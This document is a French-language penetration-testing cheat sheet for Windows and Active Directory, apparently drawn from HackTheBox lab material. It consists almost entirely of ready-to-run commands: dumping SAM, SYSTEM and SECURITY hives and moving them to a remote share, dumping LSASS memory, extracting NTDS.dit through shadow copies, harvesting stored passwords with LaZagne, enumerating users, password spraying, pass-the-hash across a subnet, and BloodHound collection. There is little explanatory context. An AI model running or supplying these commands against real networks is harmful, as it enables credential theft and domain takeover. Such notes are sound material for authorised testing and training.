
# SAM

```
hklm\sam
hklm\system
hklm\security

reg.exe save hklm\sam C:\sam.save
move sam.save \\10.10.15.16\CompData
impacket-secretsdump -sam sam.save -security security.save -system system.save LOCAL
```

```
crackmapexec smb <machine_ip> --local-auth -u user -p pass --sam
crackmapexec smb <machine_ip> --local-auth -u user -p pass --lsa
```

# LSASS

```
# Recherche du PID
tasklist /svc
Get-Process lsass
rundll32 C:\windows\system32\comsvcs.dll, MiniDump 672 C:\lsass.dmp full
pypykatz lsa minidump /home/peter/Documents/lsass.dmp 
```

# NTDS.dit

```
%systemroot%/ntds/NTDS.dit
vssadmin CREATE SHADOW /For=C:
cmd.exe /c copy \\?\GLOBALROOT\Device\HarddiskVolumeShadowCopy2\Windows\NTDS\NTDS.dit c:\NTDS\NTDS.dit

crackmapexec smb 10.129.201.57 -u user -p pass --ntds
```
# Recherche de credentials

```
start lazagne.exe all
findstr /SIM /C:"password" *.txt *.ini *.cfg *.config *.xml *.git *.ps1 *.yml
```

# Username

```
netexec smb 10.10.11.35 -u guest -p '' --rid-brute
```

# Informations

```
sudo python3 dehashed.py -q test.local -p
```

# Kerbrute

```
kerbrute userenum -d DOMAINE.LOCAL --dc <dc_ip> user.txt -o valid_ad_users
```

# Politique de mot de passe

```
crackmapexec smb 172.16.5.5 -u avazquez -p Password123 --pass-pol
rpcclient -U "" -N 172.16.5.5
enum4linux -P 172.16.5.5
ldapsearch -h 172.16.5.5 -x -b "DC=INLANEFREIGHT,DC=LOCAL" -s sub "*" | grep -m 1 -B 10 pwdHistoryLength

net use \\DC01\ipc$ "" /u:guest
net use \\DC01\ipc$ "" /u:""
net accounts
import-module .\PowerView.ps1
Get-DomainPolicy
```

# Liste de nom d'utilisateurs

```
sudo crackmapexec smb 172.16.5.5 -u htb-student -p Academy_student_AD! --users
kerbrute userenum -d inlanefreight.local --dc 172.16.5.5 /opt/jsmith.txt
```

```
# Récupérer uniquement les usernames
awk -F'\t' '/VALID USERNAME/ {print $2}' fichier.txt > user.txt
```
# Pulvérisation de mot de passe 

## Linux

```
for u in $(cat valid_users.txt);do rpcclient -U "$u%Welcome1" -c "getusername;quit" 172.16.5.5 | grep Authority; done
kerbrute passwordspray -d inlanefreight.local --dc 172.16.5.5 valid_users.txt  Welcome1
sudo crackmapexec smb 172.16.5.5 -u valid_users.txt -p Password123 | grep +
sudo crackmapexec smb --local-auth 172.16.5.0/23 -u administrator -H 88ad09182de639ccc6579eb0849751cf | grep +
```

## Windows

```
Import-Module .\DomainPasswordSpray.ps1
Invoke-DomainPasswordSpray -Password Welcome1 -OutFile spray_success -ErrorAction SilentlyContinue
```

# Module PowerShell ActiveDirectory

```
Import-Module ActiveDirectory
Get-Module
Get-ADDomain
Get-ADUser -Filter {ServicePrincipalName -ne "$null"} -Properties ServicePrincipalName
Get-ADTrust -Filter *
Get-ADGroup -Filter * | select name
Get-ADGroup -Identity "Backup Operators"
```

# Powerview

```
Get-DomainUser -Identity mmorgan -Domain inlanefreight.local | Select-Object -Property name,samaccountname,description,memberof,whencreated,pwdlastset,lastlogontimestamp,accountexpires,admincount,userprincipalname,serviceprincipalname,useraccountcontrol
Get-DomainGroupMember -Identity "Domain Admins" -Recurse
Get-DomainTrustMapping
Test-AdminAccess -ComputerName ACADEMY-EA-MS01
Get-DomainUser -SPN -Properties samaccountname,ServicePrincipalName
```

# SharpView

```
.\SharpView.exe Get-DomainUser -Help
.\SharpView.exe Get-DomainUser -Identity forend
```

# SharpHound / BloodHound

```
.\SharpHound.exe -c All --zipfilename ILFREIGHT
Invoke-BloodHound -CollectionMethod All
bloodhound-python -d htb.local -u svc-alfresco -p s3rvice -gc forest.htb.local -c all -ns 10.10.10.161
nxc ldap certified.htb -u judith.mader -p judith09 --bloodhound --collection All --dns-server IP
```

Remarque : ne pas oublier utilisateurs / mot de passe si besoin

```
./SharpHound.exe -c All -ldapusername riley -ldappassword 'Passw0rd'
```

```
# Create Custon Query
MATCH (u:User) RETURN u

MATCH (u:User)-[:MemberOf*1..]->(g:Group)-[:CanRDP]->(c:Computer) RETURN u.name AS User, c.name AS Computer
```